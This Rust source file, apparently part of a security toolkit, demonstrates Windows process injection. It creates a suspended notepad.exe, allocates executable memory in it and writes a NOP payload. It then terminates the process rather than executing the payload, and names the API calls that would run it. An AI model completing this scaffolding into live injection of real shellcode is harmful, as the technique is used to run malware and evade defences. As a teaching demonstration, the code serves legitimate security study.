//! Process Hollowing - Demonstration of process injection technique
//!
//! Part of TurboNet Security Toolkit
//! For authorized security testing only

use std::env;

#[cfg(windows)]
mod hollower {
    use std::ffi::c_void;
    use std::mem;
    use std::ptr;
    use windows::Win32::Foundation::*;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::*;
    use windows::Win32::System::Threading::*;

    pub fn hollow_process(
        target: &str,
        shellcode: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Process Hollowing Demo");
        println!("[*] Target: {}", target);
        println!("[*] Shellcode size: {} bytes\n", shellcode.len());

        unsafe {
            // Create suspended process
            let mut si: STARTUPINFOW = mem::zeroed();
            si.cb = mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = mem::zeroed();

            let target_wide: Vec<u16> = target.encode_utf16().chain(std::iter::once(0)).collect();

            let result = CreateProcessW(
                windows::core::PCWSTR(target_wide.as_ptr()),
                windows::core::PWSTR(ptr::null_mut()),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &si,
                &mut pi,
            );

            if result.is_err() {
                return Err("Failed to create suspended process".into());
            }

            println!("[+] Created suspended process");
            println!("    PID: {}", pi.dwProcessId);
            println!("    TID: {}", pi.dwThreadId);

            // Allocate memory for shellcode
            let alloc_addr = VirtualAllocEx(
                pi.hProcess,
                None,
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc_addr.is_null() {
                let _ = TerminateProcess(pi.hProcess, 1);
                return Err("Failed to allocate memory in target".into());
            }

            println!(
                "[+] Allocated RWX memory at: 0x{:016X}",
                alloc_addr as usize
            );

            // Write shellcode
            let mut bytes_written = 0;
            if WriteProcessMemory(
                pi.hProcess,
                alloc_addr,
                shellcode.as_ptr() as *const c_void,
                shellcode.len(),
                Some(&mut bytes_written),
            )
            .is_err()
            {
                let _ = TerminateProcess(pi.hProcess, 1);
                return Err("Failed to write shellcode".into());
            }

            println!("[+] Wrote {} bytes of payload", bytes_written);

            // For demo safety, we terminate instead of executing
            println!("\n[!] DEMO MODE: Terminating process (safe)");
            println!("[!] Real use would call: QueueUserAPC() or SetThreadContext()");

            let _ = TerminateProcess(pi.hProcess, 0);
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(pi.hProcess);

            println!("[+] Process terminated safely");
        }

        Ok(())
    }

    pub fn demonstrate() {
        // Benign payload for demo (just NOPs)
        let demo_shellcode: Vec<u8> = vec![0x90; 64]; // 64 NOPs

        println!("[*] Demo: Creating notepad.exe with NOP payload\n");

        let target = r"C:\Windows\System32\notepad.exe";

        match hollow_process(target, &demo_shellcode) {
            Ok(_) => println!("\n[+] Process hollowing demonstration complete"),
            Err(e) => eprintln!("\n[!] Error: {}", e),
        }
    }
}

fn print_banner() {
    println!(
        r#"
╔═══════════════════════════════════════════════════════════════╗
║   ██╗  ██╗ ██████╗ ██╗     ██╗      ██████╗ ██╗    ██╗        ║
║   ██║  ██║██╔═══██╗██║     ██║     ██╔═══██╗██║    ██║        ║
║   ███████║██║   ██║██║     ██║     ██║   ██║██║ █╗ ██║        ║
║   ██╔══██║██║   ██║██║     ██║     ██║   ██║██║███╗██║        ║
║   ██║  ██║╚██████╔╝███████╗███████╗╚██████╔╝╚███╔███╔╝        ║
║   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝         ║
║          PROC-HOLLOW - Process Injection Demo v0.1             ║
╚═══════════════════════════════════════════════════════════════╝
"#
    );
    println!("⚠  FOR AUTHORIZED SECURITY TESTING ONLY\n");
}

fn print_usage(prog: &str) {
    println!("Usage:");
    println!("  {} --demo             Run safe demonstration", prog);
    println!();
    println!("The demo:");
    println!("  1. Creates a suspended notepad.exe");
    println!("  2. Allocates RWX memory in it");
    println!("  3. Writes a NOP payload");
    println!("  4. Terminates (doesn't execute - for safety)");
}

fn main() {
    print_banner();

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        print_usage(&args[0]);
        return;
    }

    #[cfg(windows)]
    match args[1].as_str() {
        "--demo" | "-d" => hollower::demonstrate(),
        "--help" | "-h" => print_usage(&args[0]),
        _ => print_usage(&args[0]),
    }

    #[cfg(not(windows))]
    eprintln!("[!] Process Hollowing is Windows-only");
}
